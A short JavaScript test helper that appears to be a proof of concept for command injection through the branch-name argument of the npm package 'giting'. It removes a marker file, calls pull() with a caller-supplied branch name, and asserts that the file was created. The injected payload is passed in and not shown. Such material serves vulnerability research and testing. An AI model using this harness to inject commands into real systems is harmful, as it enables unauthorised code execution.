function exploitFunction(branchName) {
  const Test = require("giting");
  const fs = require("fs");

  const path = "./giting";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }

  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  const test = new Test({ workDir: "./" });
  const repo = {
    organization: "./",
    name: "./",
    branch: branchName,
  };

  test.pull(repo, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      if (err) {
        console.error(err);
      }
    });
  });
}

module.exports = { exploitFunction };